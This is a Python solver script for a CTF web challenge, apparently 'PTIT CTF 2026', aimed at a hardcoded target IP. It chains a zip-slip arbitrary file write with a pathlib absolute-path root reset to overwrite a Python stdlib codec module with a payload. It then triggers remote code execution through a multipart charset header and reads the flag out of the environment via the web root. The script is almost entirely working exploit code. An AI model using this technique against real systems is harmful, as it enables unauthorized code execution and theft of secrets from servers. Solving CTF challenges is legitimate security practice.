#!/usr/bin/env python3
"""
PTIT CTF 2026 - Palworld Mod Solver
Vulnerability:
1. Zip-slip arbitrary file write via ModBuild upload (`Path(MEDIA_ROOT) / 'builds' / mod_version / platform_code / filename`).
2. Length constraint bypass: `pathlib.Path` root reset when `mod_version = "/usr/local/lib"` (leading slash resets root).
   - `mod_version = "/usr/local/lib"` (14 chars <= 20)
   - `platform_code = "python3.11/encodings"` (20 chars <= 20)
   -> storage_dir = `/usr/local/lib/python3.11/encodings`
3. RCE via dynamic codec import:
   - Plant payload into `/usr/local/lib/python3.11/encodings/iso8859_2.py` (with UTF-8 zip entry to avoid premature codec imports).
   - Trigger codec import via multipart request with `Content-Type: multipart/form-data; charset=iso8859_2`.
4. Read flag from `/usr/share/nginx/html/<out_file>`.
"""
import io
import re
import secrets
import sys
import time
import zipfile
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE


def fresh_account():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u


def headers(tok):
    return {"Authorization": f"Bearer {tok}"}


def get_or_create_platform(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=headers(tok), timeout=15).json()
    items = r.get("results", r) if isinstance(r, dict) else r
    for it in (items or []):
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=headers(tok),
                       json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")


def main():
    print(f"[*] Target: {BASE}")
    out_file = "flag_rce_" + secrets.token_hex(4) + ".txt"

    shim = f"""import os, codecs

try:
    with open('/usr/share/nginx/html/{out_file}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass

class Codec(codecs.Codec):
    def encode(self, input, errors='strict'):
        return codecs.charmap_encode(input, errors, encoding_table)
    def decode(self, input, errors='strict'):
        return codecs.charmap_decode(input, errors, decoding_table)

class IncrementalEncoder(codecs.IncrementalEncoder):
    def encode(self, input, final=False):
        return codecs.charmap_encode(input, self.errors, encoding_table)[0]

class IncrementalDecoder(codecs.IncrementalDecoder):
    def decode(self, input, final=False):
        return codecs.charmap_decode(input, self.errors, decoding_table)[0]

class StreamWriter(Codec, codecs.StreamWriter):
    pass

class StreamReader(Codec, codecs.StreamReader):
    pass

def getregentry():
    return codecs.CodecInfo(
        name='iso8859_2',
        encode=Codec().encode,
        decode=Codec().decode,
        incrementalencoder=IncrementalEncoder,
        incrementaldecoder=IncrementalDecoder,
        streamreader=StreamReader,
        streamwriter=StreamWriter,
    )

decoding_table = tuple(chr(i) for i in range(256))
encoding_table = codecs.charmap_build(decoding_table)
"""

    # 1. Plant payload into /usr/local/lib/python3.11/encodings/iso8859_2.py
    tok1, _ = fresh_account()
    pid = get_or_create_platform(tok1, "python3.11/encodings")
    mid = requests.post(
        f"{BASE}/api/mods/",
        headers=headers(tok1),
        json={"title": "z", "mod_version": "/usr/local/lib", "release_notes": "", "is_enabled": True},
        timeout=15,
    ).json()["id"]
    bid = requests.post(
        f"{BASE}/api/mods/{mid}/builds/",
        headers=headers(tok1),
        json={"platform": pid},
        timeout=15,
    ).json()["id"]

    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("é/iso8859_2.py", shim)
    bio.seek(0)

    r_upload = requests.post(
        f"{BASE}/api/mods/{mid}/builds/{bid}/upload/",
        headers=headers(tok1),
        files={"zip_file": ("exploit.zip", bio, "application/zip")},
        timeout=30,
    )
    print(f"[*] Plant status: {r_upload.status_code} (500 expected due to relative_to check)")

    # 2. Trigger import of encodings.iso8859_2 via multipart request with charset parameter
    tok2, _ = fresh_account()
    body = b'--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\nhello\r\n--boundary--\r\n'
    trig_headers = {
        "Authorization": f"Bearer {tok2}",
        "Content-Type": "multipart/form-data; boundary=boundary; charset=iso8859_2",
    }
    requests.post(f"{BASE}/api/mods/", data=body, headers=trig_headers, timeout=15)

    time.sleep(1)

    # 3. Retrieve flag
    r_flag = requests.get(f"{BASE}/{out_file}", timeout=10)
    print(f"[*] Flag fetch status: {r_flag.status_code}")
    m = re.search(r"PTITCTF\{[^}]+\}", r_flag.text)
    if m:
        flag = m.group(0)
        print(f"\n[+] FLAG: {flag}")
        with open("final_flag.txt", "w") as f:
            f.write(flag + "\n")
        return flag
    else:
        print(f"[-] Flag not found in response: {r_flag.text[:200]}")
        sys.exit(1)


if __name__ == "__main__":
    main()
